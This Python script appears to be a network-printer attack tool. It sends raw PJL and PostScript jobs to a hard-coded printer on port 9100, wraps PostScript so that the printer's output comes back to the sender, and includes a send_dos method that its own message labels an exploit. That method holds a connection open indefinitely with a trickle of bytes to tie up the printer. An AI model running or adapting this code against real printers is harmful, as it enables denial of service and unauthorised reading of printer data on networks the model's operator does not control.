# This is a sample Python script.
import socket
import time
import sys
import datetime

PRINTER_HOST = "172.16.0.34"
PRINTER_PORT = 9100


class JobSender():

    def __init__(self, host, port):
        self.host = host
        self.port = port

    # https://www.manualslib.com/manual/538137/Brother-Hl-Series.html?page=252#manual
    # pjl_commands should end in a new line character.
    def make_pjl_job(self, pjl_commands):
        output = "\x1b%-12345X@PJL\r\n"
        for line in pjl_commands.splitlines():
            output+= line +"\r\n"
        output +="\x1b%-12345X\n"
        return output

    # ps_commands should end in a new line character.
    def make_ps_job(self, ps_commands):
        ps_job = "\x1b%-12345X\n" \
                  "@PJL ENTER LANGUAGE = POSTSCRIPT\n" \
                  "%!\n" \
                  "/print {(%stdout) (w) file dup 3 2\n" \
                  "\troll whitestring flushfile} def\n" \
                  "/== {128 string cvs print} def\n" \
                  + ps_commands + "(DELIMITER29384\n) print flush\n" \
                                   "\x1b%-12345X"


        return ps_job

    # sends a normal print job
    def send_job(self, commands, job_type, suppressed_out=False):
        if not suppressed_out:
            print("Connecting to " +  self.host + ":" + str(self.port))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))

        if job_type == "pjl":
            job = self.make_pjl_job(commands)
        elif job_type == "ps":
            job = self.make_ps_job(commands)
        else:
            job = commands

        print(job)
        if job_type == "raw-bytes":
            sock.sendall(job)
        else:
            sock.sendall(job.encode())
        time.sleep(.5)


        res = bytes()

        while True:
            data = sock.recv(1024)
            if(not data):
                break
            res += data
        if not suppressed_out:
            print("Response to response file: ")
            f = open('response', 'wb')
            f.write(res)
            f.close()
            print("Closing Connection")
        sock.close()
    def send_dos(self, suppressed_out=False):
        if not suppressed_out:
            print("Connecting to " +  self.host + ":" + str(self.port))
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))

        time.sleep(.5)

        start = datetime.datetime.now()

        # Send data indefinitely
        while True:
            print("Seconds since start of exploit: " + str((datetime.datetime.now()-start).total_seconds()))
            sock.send("x".encode())
            time.sleep(30)

        # never gonna reach
        sock.close()


if __name__ == '__main__':
    print(sys.argv[1])
    f = open(sys.argv[1])

    job_sender = JobSender(PRINTER_HOST, PRINTER_PORT)
    job_sender.send_job(f.read(), "pjl", False)
    f.close()

